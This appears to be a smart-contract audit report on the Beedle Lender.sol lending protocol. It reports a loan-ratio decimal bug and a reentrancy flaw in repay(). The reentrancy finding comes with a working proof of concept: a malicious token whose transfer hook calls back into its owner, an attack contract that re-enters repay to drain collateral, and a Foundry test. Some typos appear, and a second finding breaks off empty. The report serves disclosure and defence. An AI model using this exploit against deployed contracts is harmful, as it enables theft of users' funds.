# High 

### [H-1]: `Beedle::Lender.sol` incorrectly calculates the `loanRatio` which can lead to losses

**Description:** Due to decimals mismatching an issue stems out which leads to incorrect calculation of `loanRatio`. This allows users to borrows more than intended due to decimal mismatch.

```solidity
    uint256 loanRatio = (debt * 10 ** 18) / collateral;
```

<b>Instances:</b>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232-L287>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355-L432>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591-L710>


**Impact:** Since, user can provide less collateral but he's able to borrow more tokens than the collateral it can lead to significant loss of funds.

**Recommended Mitigations:**

Make sure to scale debt and collateral based on the token decimals in order to calculate properly the `loanRatio`. This can be easily done by changing the loanRatio calculation as follows:

```solidity
  uint256 loanRatio = ((debt * (10**(18 - loanToken.decimals()))) * 10 ** 18) / (collateral * (10 ** (18 - collateralToken.decimals())));
```

### [H-2] `Beedle::Lender.sol` can be drained due to Rentrancy in `repay` function

**Description:** Since, its is not defined which token to use as loan/collateral, anyone can use any token as loan/Collateral. An attacker can create an `ERC-777` token allowing reentrant calls on transfer to drain any token from the `Lender` contract. The `Lender` contract allows any token as `loanToken` and the `repay` function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability.

```solidity
	// transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
@>            delete loans[loanId];
        }
```

**Impact:** User's can claim collateral more than once, which will lead to losses.

**Proof Of Code:**

File: ExploitToken.sol

```solidity
//SPDX-License-Indeitifer:MIT
pragma solidity ^0.8.16;

import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";


contract ExploitToken is ERC20{

address owner;
    constructor(uint256 amount)ERC20("ExploitToken","ET"){
            owner = msg.sender;
            _mint(msg.sender, amount);
    }

    // This function overrides _afterTokenTransfer, a virtual function in the OpenZeppelin ERC20 contract.
    // It executes after every token transfer (transfer, transferFrom, or _mint). This hook will execute on all toke transfers
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
} 
```

File: Exploit7.sol

```solidity
//SPDX-License-Identifer: MIT
pragma solidity ^0.8.16;

import {ExploitToken} from "../src/ExploitToken.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/utils/Structs.sol";
import "../src/Lender.sol";

contract Exploit7{  

    Lender lender;
    bool loanBorrowed;
    uint256 i;
    address collateralToken;
    ExploitToken exploitToken;

    constructor(Lender _lender, address _collateralToken){
        lender=_lender;
        collateralToken=_collateralToken;
    }

    function attack(address _collateralToken) external{
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        exploitToken = new ExploitToken(1_000_000_000*10*18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);

        Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1_000_000*10*18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });

        bytes32 poolId = lender.setPool(pool);

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });

        Borrow[] memory borrows = new Borrow[](1);

        borrows[0] = b;        

        lender.borrow(borrows);

        // (4) Take another loan of exploitTokens to increase poolBalance

        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });

        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;

        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 /*amount*/) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the `repay` function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }
}
```
File: Lender.t.sol

Add the below test to file:

```solidity
unction test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000*10**18);
	collateralToken.transfer(address(attacker), 1_000*10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10_000*10**18);  // Lender contract has 10_000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1_000*10**18 + 1); // Attacker has 1_000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000*10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11_000*10**18); // Attacker has stolen all the 10_000 collateralToken
}

```

**Recommended Mitigations:** Always follow the:> Checks - Effect - Interactions CEI) pattern

### [H-2] `Beedle::Lender.sol` can be drained due to Rentrancy in `setPool` function

**Description:**


# Medium 

# Low
